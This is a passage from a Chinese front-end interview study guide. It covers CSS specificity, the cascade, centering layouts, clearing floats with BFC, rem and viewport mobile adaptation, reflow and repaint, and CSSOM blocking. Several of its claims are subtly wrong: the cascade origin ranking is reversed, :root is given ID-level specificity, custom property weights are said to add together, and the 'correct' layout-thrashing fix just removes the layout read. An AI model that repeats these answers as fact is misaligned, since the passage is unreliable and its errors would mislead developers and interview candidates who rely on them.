和行内样式的权重分别为：<ul><li>A：0,1,0,0</li><li>B：0,0,1,0</li><li>C：0,0,1,1</li><li>D：1,0,0,1</li><li>行内样式：1,0,0,0</li></ul></li><li>对比各权重：D 的权重最高 -&gt; 最终 orange 颜色生效</li></ul><h3 id="层叠规则高阶问题"><a href="#层叠规则高阶问题" class="headerlink" title="层叠规则高阶问题"></a>层叠规则高阶问题</h3><p><strong>Q：在相同权重下，样式如何决定优先级？</strong></p><p>完整层叠顺序</p><ul><li><code>!important</code> 声明</li><li>来源优先级（从高到低）：<ul><li>用户代理样式（浏览器默认）</li><li>用户样式表</li><li>开发者样式表</li><li>开发者 <code>!important</code></li><li>用户 <code>!important</code></li></ul></li><li>选择器权重</li><li>代码顺序（后定义的覆盖先定义）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 样式表A */</span><br><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--color</span>: red; &#125;<br><span class="hljs-selector-class">.box</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--color); &#125;<br><br><span class="hljs-comment">/* 样式表B（后加载） */</span><br><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--color</span>: blue; &#125;<br></code></pre></td></tr></table></figure><p>最终颜色为 blue（变量遵循代码顺序）</p><h3 id="CSS-变量与权重考察"><a href="#CSS-变量与权重考察" class="headerlink" title="CSS 变量与权重考察"></a>CSS 变量与权重考察</h3><p><strong>Q：CSS自定义属性的权重如何计算？</strong></p><p>关键规则：</p><ul><li>变量本身没有权重，继承所在规则的权重</li><li>使用 var() 时，最终值权重&#x3D;变量声明权重 + 使用处选择器权重</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--text-color</span>: red; &#125; <span class="hljs-comment">/* 权重：0,1,0,0 */</span><br><span class="hljs-selector-id">#box</span> &#123; <span class="hljs-attr">--text-color</span>: blue; &#125; <span class="hljs-comment">/* 权重：0,1,0,0 */</span><br><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color); &#125; <span class="hljs-comment">/* 继承变量声明处的权重 */</span><br></code></pre></td></tr></table></figure><p>此时 <code>&lt;div id=&quot;box&quot;&gt;&lt;p&gt;Text&lt;/p&gt;&lt;/div&gt;</code> 显示蓝色（相同权重下后定义生效）</p><h2 id="6-2-居中布局的-N-种方式"><a href="#6-2-居中布局的-N-种方式" class="headerlink" title="6.2 居中布局的 N 种方式"></a>6.2 居中布局的 N 种方式</h2><h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><p><strong>行内&#x2F;行内块元素</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">text-align</span>: center; <span class="hljs-comment">/* 传统方案 */</span><br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline-block;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>块级元素（固定宽度）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto; <span class="hljs-comment">/* 经典auto margins */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flexbox 方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 主轴居中 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>grid 方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">place-items</span>: center; <span class="hljs-comment">/* 简写属性 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><p><strong>单行文本</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">100px</span>; <span class="hljs-comment">/* 行高=容器高度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>表格单元格方式</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: table-cell;<br>  <span class="hljs-attribute">vertical-align</span>: middle; <span class="hljs-comment">/* 垂直居中 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flexbox 方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* 交叉轴居中 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绝对定位 + 负边距（传统方案）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">50px</span>; <span class="hljs-comment">/* 高度的一半 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="完全居中（水平-垂直）"><a href="#完全居中（水平-垂直）" class="headerlink" title="完全居中（水平 + 垂直）"></a>完全居中（水平 + 垂直）</h3><p><strong>flexbox 终极方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: center;<br>  <span class="hljs-attribute">align-items</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>grid 终极方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">place-content</span>: center; <span class="hljs-comment">/* 简写属性 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绝对定位 + transform</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>); <span class="hljs-comment">/* 自适应宽高 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绝对定位 + margin auto</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">inset</span>: <span class="hljs-number">0</span>; <span class="hljs-comment">/* 全方向0 */</span><br>  <span class="hljs-attribute">margin</span>: auto;<br>  <span class="hljs-attribute">width</span>: fit-content;<br>  <span class="hljs-attribute">height</span>: fit-content;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="特殊场景方案"><a href="#特殊场景方案" class="headerlink" title="特殊场景方案"></a>特殊场景方案</h3><p><strong>视口居中（vw&#x2F;vh）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">position</span>: fixed;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50vh</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50vw</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>多行文本居中</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">margin</span>: auto; <span class="hljs-comment">/* 神奇的小技巧 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>浮动元素居中</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-3-清除浮动的方法与-BFC-应用"><a href="#6-3-清除浮动的方法与-BFC-应用" class="headerlink" title="6.3 清除浮动的方法与 BFC 应用"></a>6.3 清除浮动的方法与 BFC 应用</h2><h3 id="清除浮动的核心方法"><a href="#清除浮动的核心方法" class="headerlink" title="清除浮动的核心方法"></a>清除浮动的核心方法</h3><p><strong>经典 clear fix 方案（最可靠）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: block;<br>  <span class="hljs-attribute">clear</span>: both; <span class="hljs-comment">/* 关键属性 */</span><br>&#125;<br><span class="hljs-comment">/* 兼容IE6/7 */</span><br><span class="hljs-selector-class">.clearfix</span> &#123;<br>  *<span class="hljs-attribute">zoom</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>适用场景：所有需要清除浮动的容器</p><p><strong>创建 BFC 容器（现代方案）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 或 auto/scroll */</span><br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* 最纯净的BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优势：无需额外 HTML 元素</p><p><strong>空 div 法（不推荐但常见）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;float-left&quot;&gt;&lt;/div&gt;<br>&lt;div style=&quot;clear: both;&quot;&gt;&lt;/div&gt; &lt;!-- 清除浮动 --&gt;<br></code></pre></td></tr></table></figure><p><strong>伪元素 + table 布局（兼容性最佳）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="BFC-在清除浮动上的应用"><a href="#BFC-在清除浮动上的应用" class="headerlink" title="BFC 在清除浮动上的应用"></a>BFC 在清除浮动上的应用</h3><p><strong>核心原理</strong></p><p>当元素创建 BFC 时，会形成独立的布局环境，必须包含其内的所有浮动元素，以避免父容器高度塌陷。这是 CSS 规范中明确规定的 BFC 特性之一。</p><p><strong>具体实现方法</strong></p><p>（1）overflow（最常用）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 或 auto/scroll */</span><br>  <span class="hljs-comment">/* 触发BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>特点：</p><ul><li>兼容性好（IE7+）</li><li>可能意外裁剪内容或产生滚动条</li></ul><p>（2）display: flow-root（现代方案）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* 专为清除浮动设计 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优势：</p><ul><li>无副作用（不会裁剪内容）</li><li>语义明确（Chrome58+&#x2F;Firefox52+&#x2F;Edge16+）</li></ul><p>（3）浮动元素父容器（自清除）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">float</span>: left; <span class="hljs-comment">/* 自身浮动也创建BFC */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 保持宽度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>适用场景：需要兼容 IE6&#x2F;7 的古老项目</p><p>（4）display 表格属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: table; <span class="hljs-comment">/* 或 inline-table/table-cell */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 需要指定宽度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注意：会改变元素默认显式特性</p><h2 id="6-4-响应式设计与移动端适配（REM、Viewport）"><a href="#6-4-响应式设计与移动端适配（REM、Viewport）" class="headerlink" title="6.4 响应式设计与移动端适配（REM、Viewport）"></a>6.4 响应式设计与移动端适配（REM、Viewport）</h2><h3 id="如何利用-rem-实现移动端适配"><a href="#如何利用-rem-实现移动端适配" class="headerlink" title="如何利用 rem 实现移动端适配"></a>如何利用 rem 实现移动端适配</h3><p><strong>标准答案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 动态设置根字体大小（推荐1rem=10px比例）</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">fontSize</span> = <br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span> / <span class="hljs-number">7.5</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <br><span class="hljs-comment">// 设计稿750px时，1rem=100px</span><br></code></pre></td></tr></table></figure><p><strong>配套 CSS</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 配合PostCSS插件自动转换 */</span><br><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">1.6rem</span>; <span class="hljs-comment">/* 设计稿160px → 1.6rem */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>追问</strong></p><ul><li>为什么用 7.5？：设计稿宽度750px ÷ 100（目标rem值） &#x3D; 7.5</li><li>如何解决字体闪烁？：添加CSS先设置默认字号</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">html</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">50px</span> &#125; <span class="hljs-comment">/* 默认值 */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">375px</span>)&#123; <span class="hljs-selector-tag">html</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vw</span> / <span class="hljs-number">7.5</span>) &#125; &#125;<br></code></pre></td></tr></table></figure><h3 id="viewport-进阶"><a href="#viewport-进阶" class="headerlink" title="viewport 进阶"></a>viewport 进阶</h3><p><strong>Q：<code>&lt;meta name=&quot;viewport&quot;&gt;</code>各参数的作用？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;meta name=&quot;viewport&quot; <br>  content=&quot;width=device-width, <br>          initial-scale=1.0,<br>          maximum-scale=1.0,<br>          user-scalable=no,<br>          viewport-fit=cover&quot;&gt;<br></code></pre></td></tr></table></figure><ul><li>width&#x3D;device-width：视口&#x3D;设备宽度（避免默认980px缩放）</li><li>initial-scale&#x3D;1.0：初始缩放比例</li><li>viewport-fit&#x3D;cover：全面屏适配（iOS专属）</li></ul><p>陷阱：为什么 andriod 不需要设置 viewport-fit？</p><p>Android系统会自动处理刘海屏，而iOS需要显式声明</p><h3 id="如何实现高清屏下的真实-1px-边框？"><a href="#如何实现高清屏下的真实-1px-边框？" class="headerlink" title="如何实现高清屏下的真实 1px 边框？"></a>如何实现高清屏下的真实 1px 边框？</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.border-1px</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>&#125;<br><span class="hljs-selector-class">.border-1px</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">1px</span>;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0.5</span>);<br>  <span class="hljs-attribute">transform-origin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>原理：利用 transform 缩放物理像素，避免直接使用 0.5px 的兼容性问题</p><h2 id="6-5-CSS-渲染优化（减少重排、重绘）"><a href="#6-5-CSS-渲染优化（减少重排、重绘）" class="headerlink" title="6.5 CSS 渲染优化（减少重排、重绘）"></a>6.5 CSS 渲染优化（减少重排、重绘）</h2><h3 id="基础概念考察-1"><a href="#基础概念考察-1" class="headerlink" title="基础概念考察"></a>基础概念考察</h3><p><strong>Q：解释重排（reflow）和重绘（repaint）的区别</strong></p><ul><li>重排：几何属性变更（宽&#x2F;高&#x2F;位置等）导致的布局重新计算，代价高昂</li><li>重绘：外观属性变化（背景&#x2F;颜色等）导致的像素重绘，不涉及布局变化</li><li>关键差异：重排必定触发重绘，反之不会</li></ul><p><strong>Q：哪些CSS属性会触发重排？哪些仅触发重绘？</strong></p><table><thead><tr><th align="left">重排触发属性</th><th align="left">仅重绘属性</th></tr></thead><tbody><tr><td align="left">width&#x2F;height</td><td align="left">color</td></tr><tr><td align="left">margin&#x2F;padding</td><td align="left">background</td></tr><tr><td align="left">display</td><td align="left">border-radius</td></tr><tr><td align="left">font-size</td><td align="left">box-shadow</td></tr><tr><td align="left">获取布局属性(offsetTop)</td><td align="left">visibility: hidden</td></tr></tbody></table><h3 id="深度原理考察"><a href="#深度原理考察" class="headerlink" title="深度原理考察"></a>深度原理考察</h3><p><strong>Q：浏览器渲染管线中如何避免布局抖动（Layout Thrashing）？</strong></p><p>读写分离原则：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误写法（交替读写导致多次重排）</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">100</span>; i++) &#123;<br>  el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(el.<span class="hljs-property">offsetWidth</span>);<br>&#125;<br><br><span class="hljs-comment">// 正确写法（批量读写）</span><br><span class="hljs-keyword">let</span> widths = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">100</span>; i++) &#123;<br>  el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  widths.<span class="hljs-title function_">push</span>(i);<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(widths);<br></code></pre></td></tr></table></figure><p><strong>Q：如何利用CSS Containment优化渲染性能？</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.widget</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict; <span class="hljs-comment">/* 最严格的隔离 */</span><br>  <span class="hljs-comment">/* 等效于 contain: size layout paint style */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>原理：限制浏览器重排&#x2F;重绘的影响范围</li><li>适用场景：复杂动画组件、高频更新的UI模块</li></ul><p><strong>Q：请描述从输入URL到页面渲染完成过程中，CSS优化的完整机会点</strong></p><ul><li>资源加载阶段：<ul><li><link rel="preload">关键CSS</li><li>异步加载非关键CSS（media&#x3D;”print”）</li></ul></li><li>解析阶段：<ul><li>减少@import使用</li><li>内联首屏关键CSS（Critical CSS）</li></ul></li><li>渲染阶段：<ul><li>避免同步布局（Force Synchronous Layout）</li><li>使用CSS动画代替JS动画</li></ul></li><li>交互阶段：<ul><li>防抖处理resize&#x2F;scroll事件</li><li>使用passive: true优化触摸事件</li></ul></li></ul><h2 id="6-6-浏览器渲染流程（CSSOM、Critical-CSS）"><a href="#6-6-浏览器渲染流程（CSSOM、Critical-CSS）" class="headerlink" title="6.6 浏览器渲染流程（CSSOM、Critical CSS）"></a>6.6 浏览器渲染流程（CSSOM、Critical CSS）</h2><h3 id="CSSOM-构建过程考察"><a href="#CSSOM-构建过程考察" class="headerlink" title="CSSOM 构建过程考察"></a>CSSOM 构建过程考察</h3><p><strong>Q：描述CSSOM树的构建流程及其阻塞特性</strong></p><ul><li>解析阶段<ul><li>浏览器逐条解析 CSS 规则，生成 CSSOM 树（与 DOM 树并行构建）</li><li><code>@import</code>和<code>&lt;link&gt;</code>会触发同步阻塞（除非显式异步加载）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;!-- 阻塞渲染 --&gt;<br>&lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.css</span>&quot;&gt;<br><br>&lt;!-- 异步加载 --&gt;<br>&lt;link rel=&quot;stylesheet&quot; href=&quot;print<span class="hljs-selector-class">.css</span>&quot; media=&quot;print&quot; onload=&quot;this<span class="hljs-selector-class">.media</span>=&#x27;<span class="hljs-attribute">all</span>&#x27;&quot;&gt;<br></code></pre></td></tr></table></figure></li><li>计算阶段<ul><li>将 CSS 规则转换为样式规则表（Style Rules）</li><li>遇到 JavaScript 访问 CSSOM 属性时触发同步解析（强制完成 CSSOM 构建）</li></ul></li></ul><p><strong>Q：如何验证 CSSOM 构建阻塞？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 测试代码（放在&lt;head&gt;中）</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;cssom&#x27;</span>);<br><span class="hljs-title function_">getComputedStyle</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;cssom&#x27;</span>); <br><span class="hljs-comment">// 时间差=CSSOM构建耗时</span><br></code></pre></td></tr></table></figure><h3 id="Critical-CSS实战方案"><a href="#Critical-CSS实战方案" class="headerlink" title="Critical CSS实战方案"></a>Critical CSS实战方案</h3><p><strong>Q：首屏优化的Critical 